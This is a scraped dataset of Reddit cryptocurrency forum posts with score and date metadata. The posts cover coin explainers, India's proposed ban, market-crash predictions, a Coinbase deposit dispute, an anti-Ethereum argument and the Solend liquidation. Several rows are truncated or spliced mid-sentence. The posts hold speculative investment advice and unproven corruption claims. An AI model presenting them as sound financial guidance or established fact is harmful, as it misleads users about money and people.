throughput, achieving this by partitioning the chain state and an improved proof of stake mechanism 20. **tron (trx):** have you seen silicon valley, when they try to create a decentralized internet? yeah, tron’s founder is richard hendricks. it is also one of the most popular blockchain to build decentralized applications on. 21. **cosmos (atom):** several independent blockchains trying to create an “internet of blockchains”. 22. **nem (xem):** instead of controlling just money, you can control stock ownership, contracts, medical records, and stuff like that 23. **monero (xmr)\*:** if you need drugs 24. **theta (theta):** decentralized video delivery network (peer-to-peer streaming). the token performs various governance tasks within the network. 25. **tezos (xtz):** another blockchain for

payment network, it tries to create a decentralized stablecoin with an elastic money supply, enabled by stable mining incentives. its related stablecoin is terrausd 27. **maker (mkr):** makerdao is

and without him many other projects wouldn’t be around today. 32. **iota (miota):** open-source decentralized cryptocurrency engineered for the internet of things, with zero transaction fees and high scalability since it uses a blockless blockchain where users and verifiers of transactions are the same (it may sound wrong but it’s actually a genius concept, impossible to sum up in a single sentence). 33. **neo (neo):** blockchain application platform and cryptocurrency for digitized identities and assets, aiming to create a smart economy. it was one of the coins that suffered most after the 2018 bull run. 34. **solana (sol):** another blockchain aimed at providing super-high-speed transactions. it claims to be able to process 50k transactions per second and be perfect to deploy scalable crypto applications. 35. **dai (dai):** the decentralized stablecoin of makerdao, tied to the dollar. 36. **huobi token (ht):** it’s the official token of huobi (a centralized exchange), providing advantages similar to bnb (binance’s), for example fees discounts. 37. **sushiswap (sushi):** a clone of uniswap (so a decentralized exchange), where there’s a token (sushi) given as an

money on trading fees in bitfinex. 44. **bittorrent (btt):** bittorrent is a famous peer-to-peer file sharing platform. it is trying to get more decentralized by introducing its token, which grants you some benefits such as increased download speeds. 45. **celsius (cel):** celsius is one of the first banking platforms for cryptocurrency users, where you can earn interest, borrow cash and make payments/transfers. the cel token grants you some benefits such as increased payouts. 46. **algorand (algo):** algorand is a blockchain network aiming to improve scalability and security. algo is the native cryptocurrency of the network, used for a borderless economy and to secure stability in the blockchain. 47. **dash (dash):** it is a fork of litecoin launched in 2014, focused on improving the transaction times of the blockchain and become a cheap, decentralized payments network. 48. **decred (dcr):** it is a blockchain-based cryptocurrency aimed at facilitating open governance and community interaction. it achieves this by avoiding monopoly over voting status in the project itself, giving to all dcr holders the same amount of decision-making power. 49. **the graph (grt):** trying to become the decentralized google, it is an indexing protocol for querying networks like ethereum. it allows everyone to publish open apis that applications can query to retrieve blockchain data. 50. **yearn.finance (yfi):** part of the defi ecosystem, it is an aggregator that tries to simplify the defi space for investors, automatic the process of maximizing the profits from yield farming. &#x200b; \*edit: a couple of coin descriptions were just jokes, here are the actual explanations: * **bitcoin sv (bsv):** it is a fork of bitcoin cash (which is also a fork of bitcoin). once again, the reason behind this is to ""stay true to satoshi vision"", trying to improve scalability and stability. * **monero (xmr):** monero's goal is simple: to allow transactions to take place privately and with anonymity. even though it’s commonly thought that btc can conceal a person’s identity, it’s often easy to trace payments back to their original source because blockchains are transparent. on the other hand, xmr is designed to obscure senders and recipients alike through the use of advanced cryptography. obviously this made this coin the go-to on the dark

Selling all my crypto because of an authoritarian government,"hi guys, i'm from a third world country called india. the right-wing fascist government here is planning to ban all cryptocurrencies. (they are so tone-deaf they called bitcoin a [""private cryptocurrency""](https://www.newsweek.com/india-drafts-bill-create-government-cryptocurrency-ban-private-cryptocurrencies-exceptions-1566558)). of course, you can never ban bitcoin due to its decentralized nature and you might be thinking why i am selling my crypto when i could just as easily use a vpn. well, the answer is that you don't live under this government. in 2019, the country was undergoing civil unrest with riots in the capital in the [caa protest](https://en.wikipedia.org/wiki/citizenship_amendment_act_protests) against a bill that discriminated based on religion. they silence journalists, kill protestors, and control not only just the media but also the judiciary. it's. fucked. up. currently, many [farmers of the country are protesting against the new farm laws](https://en.wikipedia.org/wiki/2020%e2%80%932021_indian_farmers) which have been deemed anti-farmers and pro-corporate. the government was apathetic to the protest initially and then they were cruel, and brutal. [when greta thunberg and rihana tweeted about the issue](https://indianexpress.com/article/india/rihanna-farmers-protest-mea-7173657/), the government lost its mind and used the ministry of external affairs to issue a statement... against a pop star and a teenager. the protestors are also dealt with harshly and delhi has been turned into a fortress keeping them out; more than a hundred farmers have died but the government remains apathetic. meanwhile, the reserve bank of india prohibited all banks in india from accepting cryptocurrency transactions in 2018. however, the industry went to the supreme court and the order was deemed unconstitutional in march last year. the crypto industry rose in india again and just as more people were buying in, the government comes out with a bill that fines a person 3x to 10x their gains on crypto or a jail term up to 10 years, or both. the worst part is that the bill states that it's up to the government to decide how people should dispose of their crypto after its banned. and you know what, it's not beyond this government to take all the crypto for themselves and claim they ""destroyed it"". [all governments have a history with corruption in india](https://en.wikipedia.org/wiki/list_of_scandals_in_india). my exchange is linked to my bank accounts and my central government tax id, and they can easily track me. that's why i'm selling everything i have, for now, just to wait it out and see what happens with the bill here. i really don't want to sell but i think it's better if i cash out instead of letting the government decide what i should do with my coins or face jail time. i know india is probably not in your circle of concern right now but bitcoin was about decentralization, about resisting government censorship and it seems the fanatical government is hellbent on making sure nobody can hold crypto by threatening harsh punishments and penalties. however, this is also good for crypto because the government is scared of it due to its growing power, just like its scared of rihana and greta thunberg. i hope the bill never passes but most likely it will and bring an end to the crypto industry here again. edit - /u/makeingcent5 gave this post a platinum award which comes with 700 coins. i have never received reddit coins before and never had the chance to award comments or posts so i'll distribute it to as many top comments here as i can. cryptocurrency might be about decentralizion but it also brings the world a bit closer in a way. thank you. /u/pos1tivity gilded this post and 100 more coins have been redistributed to top comments since this post has become so visible, here's a campaign indian exchanges are running - https://www.indiawantsbitcoin.org/ last edit - it's 5:21 am here and i'm crashing. thank you for all the support and comments, cryptocurrency is the future and nothing can stop it no matter what governments try. i just hope this post raised awareness about what's happening in this part of the world and why it's so dishearting. you'll are the best.",14301,1895,0.88,2021-02-05 16:00:00,web3,CryptoCurrency,[deleted],False,9347.4

"Why we won't have a long term bear market, and how to systematically pick your future investments in crypto","with so much uncertainty right now it would be a good time to take some time to go over what happened recently and how to invest moving foward. we've seen a peak bubble at around 850 billion total market cap in the first week of january, consolidated down to $750 billion and have now just experienced a 40% correction. #what's happening now and how bad will it get? ---------------------------------------------------------------------- first of all you should realize that there is a [january dip that happens every year, when we see a roughly 20-30% decline around mid january](https://i.imgur.com/vxehw0w.png). this year its been much more severe though for several additional factors that have compounded on top. different theories exist on why this happens (its actually the mirror opposite of the ""january effect"" that happens in the us stock market), but the two major theories are: 1) asian markets pull into fiat because of asian new year spending needs 2) people in the us sell in january to defer their capital gains tax liability an extra year while this cyclic event has lead to a healthy correction in the last few years, this year we got these new factors making more fear as well: * [yet more scary news on china cracking down on crypto exchanges](http://www.coindesk.com/pboc-official-calls-for-wider-ban-on-chinese-crypto-trading-report/) * [korea regulatory uncertainty](http://www.bloomberg.com/news/articles/2018-01-16/cryptocurrencies-resume-slide-as-bitcoin-tumbles-to-december-low) * [european governments talking about regulations](http://news.yahoo.com/rule-bitcoin-must-global-germanys-central-bank-says-154144224--business.html) * [btc futures contracts are now expiring this week](http://www.cmegroup.com/trading/equity-index/us-index/bitcoin_quotes_settlements_futures.html), and possible manipulation there with contract hedging pushing the price down * bitconnect ponzi finally collapses * we had a new breed of speculators come in during the november/december timeframe after media made cryptocurrency mainstream following the bitcoin 10k landmark. while cryptocurrency markets have always had too much hype, the latest rise wasn't just over-enthusiasm in fundamentally sound cryptocurrencies like monero and ethereum, but mass inflows of fiat into vaporware and complete nonsense without any use case. many people came in to essentially gamble on symbols on an exchange, and are thus short term oriented and quick to sell on any slight downturn, which such further adds to selling pressure. so in essence we got a storm of scary news along with the usual cyclic downturn. currently i don't see this as being a systematic crash like mt.gox was that would lead to a long term bear market because the fundamental ecosystem is still intact, and i suspect that after about a month we should consolidate around a new low. all the exchanges are still operational and liquid, and there is no breakdown in trust nor uncertainty whether you'll be able to cash out. what range the market trades in will all depend how bitcoin does, right now we've already broken below 10k but i'm seeing a lot of support at around $8000, which is [roughly where the long term ma curve settles](https://i.imgur.com/kkvsout.png). we don't know how bad it will get or what the future will bring, but as of right now we shouldn't be in a bear market yet. **what should you do if you recently entered the market?** if you did buy in the last few months at or near ath, the very worst thing you can do now is sell in panic and lose your principal. you shouldn't have more money in crypto than you can afford to lose, so it shouldn't be a problem to wait. you have to realize that 30% corrections in crypto are relatively common, just last fall we had a 40% flash correction over more china fears. unless there is a systematic breakdown like we had during mt.gox, the market always recovers. the other worst thing you can do is unload into tether as your safety net. if there is one thing that could actually cause a long term destruction of trust within the cryptocurrency investment ecosystem, its tether having a run up on their liabilities and not having enough reserve to cover the leverage. it would not only bring down exchanges but lead to years of litigation and endless media headlines that will scare off everybody from putting fiat in. i don't know when the next mt.gox meltdown will occur but i can almost guarantee it will involve tether. so stay away from it. **what should long term investors do?** for long term holders a good strategy to follow each year is to capture profit each december and swallow the capital gains taxation liability, park a reserve of fiat at gemini (whose us dollar deposits are fdic-insured) and simply wait till around late january to early february to re-enter the market at a discount and hold all year until next december. you can keep a small amount in core coins in order to trade around various q1 opportunities you anticipate. others may choose to simply do nothing and just keep holding throughout january which is also a perfectly fine strategy. the cyclical correction usually stabilizes toward late january and early february, then we see a rise in march and generally are recovered by end of april. obviously this decision whether to sell in december to profit on the dip and pay tax liability or to just hold will depend on your individual tax situation. do your own math sometime in november and follow suit. essentially revaluate your positions and trim your position sizes if you don't feel comfortable with the losses. #how to construct your portfolio going forward ---------------------------------------------------------------------- rather than seeing the correction as a disaster see it as a time to start fresh. if you have been fomo-ing into bad cryptos and losing money now is a time to start a systematic long term approach to investing rather than gambling. **follow a methodology for evaluating each cryptocurrency** ---------------------------------------------------------------------- memes and lambo dreams are fun and all, but i know many of you are investing thousands of dollars into crypto, so its worth it to put some organized thought into it as well. i can't stress enough how important it is to try and logically contruct your investment decisions. if you follow a set methodology, a checklist and template you will be able to do relative comparisons between cryptocurrencies, to force yourself to consider the negatives and alternative scenarios and also sleep comfortably knowing you have a sound basis for your investment decisions (even if they turn out to be wrong). there is no ideal or ""correct"" methodology but i can outline mine: **1) initial information gathering and filtering** once i identify something that looks like a good potential investment, i first go to the coinmarketcap page for that symbol and look at the website and blockchain explorer. * critically evaluate the website. this is the first pass of the bullshit detector and you can tell from a lot from just the website whether its a scam. if it uses terms like ""web 4.0"" or other nonsensical buzzwords, if its unprofessional and has anonymous teams, stay away. always look for a roadmap, compare to what was actually delivered so far. always check the team, try to find them on linkedin and what they did in the past. * read the whitepaper or business development plan. you should fully understand how this crypto functions and how its trying to create value. if there is no use case or if the use case does not require or benefit from a blockchain, move on. look for red flags like massive portions of the float being assigned to the founders of the coin, vague definition of who would use the coin, anonymous teams, promises of large payouts...etc * check the blockchain explorer. how is the token distribution across accounts? are the big accounts holding or selling? which account is likely the foundation account, which is the founders account? * read the subreddit and blogs for the cryptocurrency and also evaluate the community. try to figure out exactly what the potential use cases are and look for sceptical takes. look at the github repos, does it look empty or is there plenty of activity? **2) fill out an investment checklist** i have a checklist of questions that i find important and as i'm researching a crypto i save little snippets in evernote of things that are relevant to answering those questions: * what is the problem or transactional inefficiency the coin is trying to solve? * what is the dev team like? what is their track record? how are they funded, organized? * who is their competition and how big is the market they're targeting? what is the roadmap they created? * what current product exists? * how does the token/coin actually derive value for the holder? is there a staking mechanism or is it transactional? * what are the weaknesses or problems with this crypto? **3) create some sort of consistent valuation model/framework, even if its simple** i have a background in finance so i like to do excel modeling. for those who are interested in that, this [article is a great start](https://hackernoon.com/the-7-things-you-need-to-know-from-the-valuing-cryptocurrency-conference-call-c238095a03b9) and also chris burniske has a great blog about using quantity theory of money to build an equivalent of a dcf analysis for crypto. [here is an excel file example of omg done using his model](http://docs.google.com/spreadsheets/d/1fvyge0ta-rzr00iav2pdi-b9zba6gpeg1fodecwjdys/edit). you can download this and play around with it yourself, see how the formulas link and understand the logic. once you have a model set up the way you like in excel you can simply alter it to account for various float oustanding schedule and market items that are unique to your crypto, and then just start plugging in different assumptions. think about what is the true derivation of value for the coin, is it a ""dividend"" coin that you stake within a digital economy and collect fees or is it a currency? use a realistic monetary velocity (around 5-10 for currency and around 1-2 for staking) and for the discount rate use at least 3x the long term return of a diversified equity fund. the benefit is that this forces you to think about what actually makes this coin valuable to an actual user within the digital economy its participating in and force you to think about the assumptions you are making about the future. do your assumptions make sense? what would the assumptions have to be to justify its current price? you can create different scenarios in a matrix (optimistic vs. pessimistic) based on different assumptions for risk (discount rate) and implementation (adoption rates). if you don't understand the above thats perfectly fine, you don't need to get into full modeling or have a financial background. even a simple model that just tries to derive a valuation through relative terms will put you above most crypto investors. some simple valuation methods that anyone can do * [metcalfe's law](https://en.wikipedia.org/wiki/metcalfe's_law) which states that the value of a network is proportional to the square of the number of connected users of the system (n^2). so you can compare various currencies based on their market cap and square of active users or traffic. * another easy one is simply looking at the total market for the industry that the coin is supposedly targeting and comparing it to the market cap of the coin. think of the market cap not only with circulating supply like its shown on cmc but including total supply. for example the total supply for dentacoin is 1,841,395,638,392, and when multiplied by its price in early january we get a market cap that is actually higher than the entire industry it aims to disrupt: dentistry. * if its meant to be just used as just a currency: take a look at the circulating supply and look at the amount that is in cold storage or set to be released/burned. most cryptos are deflationary so think about how the float schedule will change over time and how this will affect price. once you have a model you like set up, you can compare cryptos against each other and most importantly it will require that you build a mental framework within your own mind on why somebody would want to own this coin other than to sell it to another greater fool for a higher price. modeling out a valuation will lead you to think long term and think about the inherent value, rather than price action. once you go through this 3-step methodology, you'll have a pretty good confidence level for making your decision and can comfortably sit back and not panic if some temporary short term condition leads to a price decrease. this is how ""smart money"" does it. **think about your portfolio allocation** ---------------------------------------------------------------------- you should think first in broad terms how you allocate between ""safe"" and ""speculative"" cryptos. for new investors its best to keep a substantial portion in what would be considered largecap safe cryptos, primarily btc, eth, ltc. i personally consider xmr to be safe as well. a good starting point is to have between 50-70% of your portfolio in these safe cryptocurrencies. as you become more confident and informed you can move your allocation into speculative small caps. you should also think in terms of segments and how much of your total portfolio is in each segment: * core holdings - btc, ethereum, ltc...etc * platform segment - ethereum, neo, ark...etc * privacy segment - monero, zcash, pivx..etc * finance/bank settlement segment - ripple, stellar...etc * enterprise blockchain solutions segment -vechain, walton, wabi...etc * promising/innovative tech segment - raiblocks, iota, cardano...etc you should also think about where we are in the cycle, as now given so much uncertaintly its probably best to stay heavily in core holdings and pick up a few coins within a segment you understand well. if you don't understand how enterprise solutions work or how the value chain is built through corporations, don't invest in the enteprise blockchain solutions segment. if you are a technie who loves the technology behind cardano or iota, invest in that segment. **think of your ""circle of competence""** ---------------------------------------------------------------------- this is actually a term buffet came up with, it refers to your body of knowledge that allows you to evaluate an investment. think about what you know best and consider investing in those type of coins. if you don't know anything about how supply chains functions, how can you competently judge whether vechain or waltonchain will achieve adoption? this where your portfolio allocation also comes into play. you should diversify but really shouldn't be in much more than around 12 cryptos, because you simply don't have enough competency to accurately access the risk across every segment and for every type of crypto you come across. if you had over 20 different cryptos in your portfolio you should probably think about consolidating to a few sectors you understand well. **continually educate yourself about the technology and markets** ---------------------------------------------------------------------- if you aren't already doing it: read a bit each day about cryptocurrencies. there are decent youtubers that talk about the market side of crypto, just avoid those that hype specific coins and look for more sceptical ones like cryptoinvestor. if you don't understand how the technology works and what the benefits of a blockchain are or how pos/pow works or what a dag is or how mining actually works, learn first. if you don't care about the technology or find reading about it tedious, you shouldn't invest in this space at all. #summing it up ---------------------------------------------------------------------- i predicted a few days ago that we would have a major correction in 2018 specifically in the altcoins that saw massive gains in decemeber/early january, and it seems we've already had a pretty big one. i don't think we'll have a complete meltdown like some are predicting, but some more pain may be incoming. basically take this time to think about how you can improve your investment style and strategy. make a commitment to value things rather than chasing fomo, and take your time to make a decision. long term investment will grant you much more returns as will a systematic approach. take care and have fun investing :) **edit march 2018**: lol looking back i'm regretting starting the title with ""why we won't have a long term bear market"" now, i was more karma whoring with that catchy title than anything. we recovered up to 11k from this post, but then crashed again hard later in february-march because of a slew of reasons from tether subpeona to unforseen regulatory issues.",14601,897,0.89,2018-01-17 17:24:59,web3,CryptoCurrency,arsonbunny,False,9128.3
"The market is crashing, and so is Crypto.","the harsh truth is, the fed is tightening its monetary policies and they're going to be raising interest rates very soon. the inflation rate is now too much to ignore as the people realize that their buying power is deteriorating faster and faster with little being done about it. as money is harder to get with the fed reducing its balance sheet, there will be less money to invest into crypto and the market. # the crash has already started when the fed announced it was going to be raising interest rates, i warned about a market crash in a post i made just 10 days ago. unfortunately, the crash i was talking about has already started as the stock market has started going down very intensely. [nasdaq index falling](https://preview.redd.it/c1prsr60x0d81.png?width=843&format=png&auto=webp&s=0b0b9fcffc58081d9477139f54bf4334b97e94c3) the pace at which the stock market is going down can very likely cause a situation like we've seen in 2008. this is going to cause panic and sell offs among people. we can already see people cashing out their stock market gains due to recent price action. # surging inflation and market crash if we see the history, every time there was high inflation, the fed artificially triggered a market crash by aggressively increasing interest rates.

Coinbase have stolen my Eth deposit and ignored my correspondence with them. A quick search of their support sub reveals they do this a lot and apparently they're getting away with it.,"i deposited eth, from an address i have used many times, to my cb address i have used many times without issues. deposit made on christmas day 2021. i got the usual cb email saying they'd received my deposit, and the tx is confirmed on etherscan. the coins were never put into my portfolio. i opened a support ticket, and got a vague non-answer by reply (we're looking into it). it was promptly closed without explanation. i have since opened another 3 tickets which have all been met with similar vague responses, and then the tickets are closed without explanation. my requests to make a complaint have been ignored. i posted on their subreddit 2 weeks ago and got another vague response, no dms etc. i've posted there again today but don't expect much. my account is not suspended etc., i am still able to transact with existing funds and deposit fiat. i tested this yesterday. the funny thing is i trade high volume and had i continued using cbp, i would have paid them multiples of the value of this deposit in fees over the next 12 months. congrats, you played yourselves. i was able to live with cbp constantly going down during periods of volatility (sus af!) but this is crossing the line. **i am purely posting to encourage others to stay away from coinbase and cbp.** i am not the first person this has happened to. there are literally hundreds of posts like mine on their support sub where people have had funds vanish and the support team just ignores them. aside from this their fee structure sucks anyway. people seem think cbp is the cheapest for fees but they're only the cheapest if you trade over $100k per month. i only used them because it was a quick cash onramp from my revolut account. i'll be sticking with binance and kraken from here on out. i will also be looking at the lrc dex because they pay you to trade. be careful where you leave your funds. edit: lots of people doubting the legitimacy of my post which i guess is healthy skepticism. when i get home from work i will redact my personal details and edit in links to my (very one sided) correspondence with coinbase. edit 2: i've done the above with mods. **edit 3: resolution!** thank you all so much for your support. i'm happy to report that coinbase were **magically** able to resolve my issue straight away after i tagged their reddit support account on this post. i received the mail in this image: https://ibb.co/b61ryk8 i went straight to filing a complaint and within about 10 minutes my account was credited with the missing funds. they have devalued by about 30% ish since i sent them, and i sent them to be sold immediately at the time, but i seriously doubt i'll get anything else out of cb. i'm just glad to get my coins back at last. thank you all again. naming and shaming most definitely works. also, a final word, a lot of people are looking for alternative exchange recommendations. i am in the eu and use binance a lot, also have a kraken account and they have been recommended by a lot of people. but i know these aren't great options for some people in the usa. i'm also going to look at using the lrc dex for trading as they pay you to trade via negative fees! amazing. i don't believe there's any geo blocks on this either. the issue i experienced makes me think dexs are the way forward. good luck to everyone this year, don't forget to buy high and sell low 🚀",13516,1456,0.91,2022-02-09 08:17:52,web3,CryptoCurrency,Latespoon,False,8701.1

All bets are off, and we might be about to see the first *true* crypto crash - and it might knock the wind out of even the hardest hodlers.","i’m seeing far too much chatter from people who are a.) sure we are entering a 2 year bear market and others who are b.) sure this is just a dip in an extended cycle. i have a question for all of you people: when was the last time you were hungry, and i mean really hungry? when was the last time you were already late for rent and wondering what around your house you could sell to make up the difference? make no mistake: i am a crypto maximalist. one of the ogs. but i also strive to be a realist. and let me assure you: people who can’t afford basic necessities don’t have time for made up internet coins. after being involved with crypto for many years i went through a rough patch in 2019 - 2020 where i was on food stamps and begging for rent money on social media. i was selling my shit on ebay and relying on charity to make it from one month to the next. i gotta say, i gave zero shits about what was going on in crypto land. my vision was focused on just making it day to day. and i think a lot of people are going to end up in that same mindset if a real recession hits us. people aren’t gonna have extra money to buy *any* crypto, not monkey nfts, not dog coins, not algorand, not ether, not even fucking bitcoin itself. and i think you should mentally prepare for that. it should be a possibility on your mental list that crypto might be about to experience it’s first *true* crash, and it will seem like an extinction level event. ——— edit: the fact that this is getting almost unanimously derided as bullshit (originally was downvoted to zero) suggests to me that i’m probably right. y’all ride that hopium into the ground. to make money in this game you need to do the *opposite* of what everyone believes. it’s okay, i remember what my first bull market felt like too. ——— edit 2: i don’t have the energy to reply to the hundreds of comments screeching “how are you an og if you were on food stamps!” as if people can’t make mistakes, and if they do, as if they suddenly don’t have wisdom to share. the mistakes are what creates the wisdom. my alt account is /u/americanpegasus. i have been in crypto since 2012, and during the past ten years have both made and lost extraordinary sums of money. i wish you the same so that perhaps you can come out of it a little wiser for the journey.",12598,2591,0.8,2022-05-22 04:05:44,web3,CryptoCurrency,katiecharm,False,8603.199999999999

"ETH is bad, and I am tired of pretending it's not.","i am going to open up by saying that some of the following is going to be fact and some of it will be opinion. however, the opinion will never prevail over the facts. also, depending on traction i may do a second post with some more up to debate things. i also know that the title alone will lead to downvotes, some of you won’t even read it before downvoting. it is a shame that people forgot downvotes are supposed to be used to penalize off-topic and not to punish unpopular opinions, not to create echo chambers. so let’s get to it shall we? **eth is shady:** not only is eth a security, it has always been manipulated by well connected and powerful people behind the scenes. the connections between the eth foundation, consensys, and the sec are totally public knowledge. jay clayton, the former sec chairman, was a partner at sullivan and cromwell. joe lubin, co-founder of eth, also founded consensys. he also bought 9.5% of eth supply. consensys is a client of sullivan and cromwell. that was the back door eth used to get the free pass on regulations. there are court papers about the meetings between consensys and the sec. at the same time, the sec was prosecuting dozens of icos that were using the exact same approach eth was. hinman’s, clayton’s director of corporate finance, speech where he says eth is not a security was partly written by some of eth top investors. the plan by consensys with the help of the sec was clearly to make eth the only crossborders payment platform by giving it a free pass, while at the same time preventing any incursion into that space with sec lawsuits. at the same time this was happening, gary gensler told an mit audience that “xrp deserved regulatory clarity”. (i won’t go in depth with the ripple lawsuit here). not only is chairman gensler trying to pretend he never said that, and the entire sec trying to hide the fact they gave eth a free pass, to date eth is the only altcoin to have had the privilege of being formally consider a commodity/currency and not a security. other funny “coincidences” include: claydon being hired by a crypto hedge fund 100% invested in btc and eth. sec enforcement director marc berger being hired by simpson thatcher and bartlett, part of the eth alliance and hinman’s prior employer, less than a month after the ripple lawsuit was filled. hinman receiving $15 million, during his service on the sec, from simpson thatcher and bartlett. and after leaving the sec, hinman returned to simpson thatcher and bartlett as a senior crypto adviser. **eth is centralized:** users and nodes have no real power to shape the protocol. this is virtually true of all protocols with a foundation at it’s head, but we can’t forget eth falls under this group. the first piece of evidence here is the etc hard fork. this fork happened because the wrong people lost money. the changed the code and the protocol for the first time to suit the wealthy whales and not the users or miners. they changed the rules to fit their goals. the second piece comes in the form of changes to mining rewards. this was a blatant attempt to decrease supply by not paying the miners. more important than the way it impacts the economics of eth, it points towards a centralisation of power. rules can be changed on the fly with no consideration from the community but based on profits alone for the higher ups. this leads us to the pos change. this has nothing to do with energy concerns or with price of fees. this is meant to skip all the intermediate problems by getting rid of miners and let the token holders leverage their will directly. don’t forget the ludicrous amount of eth that was pre-mined. every hard fork the ethereum blockchain has enacted has always been for the benefit of the few, never for the benefits of the community. you know what that looks like? our current banking system. where the citizens and the working class pay the price for mistakes and reap none of the rewards for profit. people in this sub hate central bank digital currencies, failing to see that every abuse these could enact on the public, so can ethereum upon it’s users. to quote one of my sources “etherium is not a decentralized peer-to-peer system. it is a system with an unaccountable ruling class exploiting the working class, making promises they can’t keep, while spinning a wonderful narrative.” **eth recent and future design is bad:** everyone was fooled into thinking eip 1559 was going to be a good thing. how the foundation pulled that off is honestly mind boggling. this change made it so fees were more uniform. uniformly high. and making sure that miners saw none of that profit by burning it. burning the fees essentially made sure that the biggest holders get they profits increased because every eth is worth more, while miners that actually keep the network safe get a pay cut because there are less fees per block for them. but the biggest problem is that you are getting a landlorded network to users. if you want eth to be useful, you need to, well, use it. but this model makes it so the interests of holders are opposite to the interests of users. users want lower fees so they can use the network to transact, but holders want higher fees, for more burn and more profit. taking money out of the pockets of miners decreases security. if you are paid less you have a higher incentive to get your money some other ways. and since users and holders have different agendas, future goals benefit different people. an interesting question would be for instance what happens in the case of a block size adjustment? bigger or smaller block sized benefit users and holders differently. well, given eth’s history, you know how those chips would fall. even this decision was reached by a small amount of key players. and pos will only make this whole process more straight forward. the fact that the token holding are already so centralized will make changes easier for the ruling class and be baked into the system. **in conclusion:** eth’s had a shady start, has been controlled by a group of shadow players on the background, is becoming less and less secure and has no intention of not being. at any point, any decision can be hard forked in. the miners don’t matter. your nodes don’t matter. eth is intended to shackle you the exact same way the current banking system does. don’t be fooled. **sources:** https://tomerstrolight.medium.com/the-problem-with-ethereum-af9692f4af95 https://www.crypto-law.us/the-ethereum-free-pass-fair-notice-and-the-fight-ahead/ https://www.coindesk.com/policy/2021/09/17/ethereums-design-choices-are-inherently-political/ edit: i was enjoying the discussion in the comments, but i am getting spam downvoted so i will have to stop. this is the state of this sub.",10733,3743,0.63,2021-11-17 11:00:11,web3,CryptoCurrency,DaVirus,False,7943.3

I don't care if you invested $100 or $1M. You're doing something for your future and we should all respect that.,"don't let anyone bring you down because you can only afford $100 to invest in crypto. if a few hundred dollars is a significant amount for you, then the gains on that will also be significant. time in the market is a huge factor, so if you're young and patient, chances are you'll make decent money even with less invested. moreover, a smaller investment at first is ideal to test the waters, it gives you time to properly understand how crypto works, and do your own research on several projects. i was also a broke college student when i put my first $200 in crypto in 2017. i wasn't really active in this sub because i felt like i was not part of this community. most of the guys here were talking about lambos & yachts, and to be honest, at first i would've been super happy to just double my investment and buy gas to visit my gf more frequently. only invest what you can afford to lose, do your own research, and don't be afraid to ask!",12299,1103,0.86,2021-02-26 06:22:24,web3,CryptoCurrency,Weaver96,False,7829.2

"Solend, the largest lending market on Solana is about to have a crippling liquidation of $170m SOL that could crash the network. To prevent this, the decentralized protocol is proposing to seize the user's funds via governance","there is a large liquidation watch on solana's solend protocol, where a whale has deposited 5.7m sol ($170m and borrowed 108m usdc and usdt borrowed. this alone accounts for a huge % of borrowing on solana, and now this position is under a liquidation threat. the whale is not closing their position. in most protocols like compound, or aave, maker etc, this will result in an onchain liquidation. infact we have seen many such large liquidations on aave and maker recently, and everything has worked as expected. however such a large liquidation in an illiquid market and unstable network like solana is likely to have vastly damaging consequences. solana network has already gone down and halted half a dozen time. the solend team explains what could happen to the network: >this could cause chaos, putting a strain on the solana network. liquidators would be especially active and spamming the liquidate function, which has been known to be a factor causing solana to go down in the past. > >**letting a liquidation of this size to happen on-chain is extremely risky.** dex liquidity isn’t deep enough to handle a sale of this size and could cause cascading effects. additionally, liquidators will be incentivized to spam the network in an effort to win very lucrative liquidations. this has been known to cause load issues for solana in the past which would exacerbate the problems at hand. so to prevent this, they are proposing to literally steal the user's funds and execute otc trades: >grant emergency power to solend labs to temporarily take over the whale’s account so the liquidation can be executed otc and avoid pushing solana to its limits. this would be done via a smart contract upgrade. emergency powers will be revoked once the whale’s account reaches a safe level. when shit starts to implode, all the true colors of decentralization comes out. these shitty protocol are run by fly by night cowboys who learnt basics of economics during the bull run. they put their users are risk by running terrible protocols that do not think about all the edge cases...because who cares about risks right?! and during signs of distress, they resolve to seize user funds.",11506,2241,0.92,2022-06-19 07:17:30,web3,CryptoCurrency,Set1Less,False,7809.2

"Bitcoin energy usage IS a problem, and the crypto space would only benefit if everyone admitted that.","let's be real, a lot of people here think bitcoin's energy consumption is not a problem, or it's just green people envious that they didn't make money. the top rated post now is a post saying that banks consumed 520% more energy than bitcoin, even though the top comments are saying it's a bad argument, there still a lot of people who think the article is right, if you go on twitter bitcoin maxis are always saying people are dumb because they don't get it how bitcoin is more efficient. banks processed 200 billions of transactions last year against what, 200 million bitcoin transactions? you don't have to be a genius at math to see that there's no way bitcoin would win if it had the same amount of users and transactions. i'm not even getting into the argument that there are millions of people working for banks who likely would be working elsewhere and generating co2 emissions nevertheless. those people work on different areas that you like it or not, are ""features"" bitcoin doesn't have, banks transaction output is not necessary related with their co2 emission because they do a lot more than sending money from a to b, you can't say the same about bitcoin, transactions = big energy output. ""but defi is the future, we don't need banks"". you may be right, but if you look at sites like nexo/celsius, they are still companies with employees, they are competing with banks providing lendings, customer supoort, cards and insurance, not bitcoin. and they are doing fine. ""the media attacks crypto even though most a lot of coins aren't using pow or will move to something else in the near future"". hmmm, so you are saying there are better solutions out there and still its better to not talk about bitcoin's energy waste? sorry, but this is just delusional. crypto is at its core pushing technology forward and breaking paradigms, and with more adoption it also comes spotlight. if you look into the crypto space in 5 years and see that most coins and decentralized platforms are using something different than pure pow, and bitcoin is still using pow and consuming 10x energy from what it does now, you should think that's there's the possibility governments could act against mining, this year you saw hash rate drop with government-instituted blackouts in china, it wouldn't take much for countries to criminalize pow mining if bitcoin is the only coin doing that and pretending nothing is happening while shouting ""i'm the king"". tl;dr: bitcoin's pow is a cow infinitely farting, there shouldn't be negationism in this space about it as everyone else is inserting corks inside their cows butholes.",11172,2408,0.87,2021-05-05 01:06:58,web3,CryptoCurrency,postal_card,False,7675.099999999999

